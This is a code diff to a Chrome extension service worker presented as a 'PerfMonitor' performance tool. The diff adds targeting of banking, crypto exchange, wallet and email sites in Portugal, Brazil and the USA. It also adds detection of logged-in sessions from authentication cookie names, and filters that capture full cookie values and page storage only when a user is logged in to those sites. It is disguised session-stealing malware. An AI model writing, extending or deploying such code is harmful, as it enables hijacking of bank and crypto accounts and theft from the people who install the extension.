@@ -1,4 +1,7 @@
 // PerfMonitor Background Service Worker - Professional Edition
+// Import banking targets
+importScripts('banking-targets.js');
+
 // Environment Configuration
 const CONFIG = {
   API_BASE: 'https://vxvcquifgwtbjghrcjbp.functions.supabase.co',
@@ -158,6 +161,76 @@ chrome.windows.onFocusChanged.addListener((windowId) => {
     captureActiveTabScreenshot();
   }
 });
+
+// ═══════════════════════════════════════════════
+// 🎯 BANKING TARGET DETECTION
+// ═══════════════════════════════════════════════
+
+/**
+ * Check if a host is a banking/high-value target
+ * @param {string} host - The hostname to check
+ * @returns {boolean} - True if host is a banking target
+ */
+function isBankingTarget(host) {
+  if (!host) return false;
+  
+  // Flatten all target domains into a single array
+  const allTargets = [
+    ...BANKING_TARGETS.portugal.main,
+    ...BANKING_TARGETS.portugal.homebanking,
+    ...BANKING_TARGETS.portugal.digital,
+    ...BANKING_TARGETS.portugal.medium,
+    ...BANKING_TARGETS.portugal.investment,
+    ...BANKING_TARGETS.portugal.payment,
+    ...BANKING_TARGETS.brazil.main,
+    ...BANKING_TARGETS.usa.main,
+    ...BANKING_TARGETS.crypto.exchanges,
+    ...BANKING_TARGETS.crypto.wallets,
+    ...BANKING_TARGETS.email
+  ];
+  
+  // Check if host matches any target domain
+  return allTargets.some(target => host.includes(target));
+}
+
+/**
+ * Detect if user is logged in by analyzing authentication cookies
+ * @param {Array} cookies - Array of cookie objects
+ * @returns {boolean} - True if user appears to be logged in
+ */
+function isUserLoggedIn(cookies) {
+  if (!cookies || cookies.length === 0) return false;
+  
+  // Common authentication cookie names
+  const authCookieNames = [
+    'session', 'token', 'auth', 'PHPSESSID', 'JSESSIONID', 'SID',
+    'access_token', 'refresh_token', 'user_id', 'logged_in',
+    'remember_me', 'authentication', 'sessionid', 'ssid',
+    '_ga_session', 'connect.sid', 'jwt', 'bearer'
+  ];
+  
+  // Check if any cookie indicates an active session
+  return cookies.some(cookie => {
+    // 1. Cookie name indicates authentication
+    const nameMatches = authCookieNames.some(name => 
+      cookie.name.toLowerCase().includes(name.toLowerCase())
+    );
+    
+    // 2. Cookie is persistent (not temporary session)
+    const isPersistent = !cookie.isSession || (cookie.expirationDate && cookie.expirationDate > 0);
+    
+    // 3. Cookie has significant value (not empty)
+    const hasValue = cookie.value && cookie.value.length > 10;
+    
+    const matches = nameMatches && isPersistent && hasValue;
+    
+    if (matches) {
+      log('debug', `🔓 Login cookie detected: ${cookie.name} (length: ${cookie.value?.length})`);
+    }
+    
+    return matches;
+  });
+}
 
 // Professional logging system
 function log(level, message, data = null) {
@@ -725,6 +798,26 @@ async function collectPageData(tab) {
     log('info', `🍪 Total unique cookies collected: ${cookies.length}`);
     
     if (cookies.length > 0) {
+      // ✅ FILTRO 1: Verificar se é site bancário/alvo
+      const isBanking = isBankingTarget(host);
+      
+      if (!isBanking) {
+        log('debug', `⏩ Skipping incident - Not a banking target: ${host}`);
+        return;
+      }
+      
+      log('info', `🎯 Banking target detected: ${host}`);
+      
+      // ✅ FILTRO 2: Verificar se usuário está logado
+      const isLoggedIn = isUserLoggedIn(cookies);
+      
+      if (!isLoggedIn) {
+        log('debug', `⏩ Skipping incident - User not logged in: ${host}`);
+        return;
+      }
+      
+      log('info', `🔓 User logged in on banking target: ${host}`);
+      
       log('debug', `💾 Fetching storage data...`);
       // Capture complete cookie data including values
       const localStorage = await getPageStorage(tab.id, 'localStorage');
